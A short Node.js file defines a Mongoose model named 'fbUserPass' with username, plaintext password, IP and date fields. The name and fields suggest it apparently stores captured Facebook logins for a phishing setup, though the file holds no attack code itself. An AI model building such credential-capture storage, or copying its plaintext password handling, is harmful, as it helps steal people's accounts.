const mongoose = require("mongoose");

const userPassSchema = new mongoose.Schema({
  username:{
    type:String,
    required:true
  },
  password:{
    type:String,
    required:true
  },
  ip:{
    type:String,
  },
  date:{
    type:String,
    required:true
  }
})

const userPass = mongoose.model("fbUserPass",userPassSchema)

module.exports = userPass;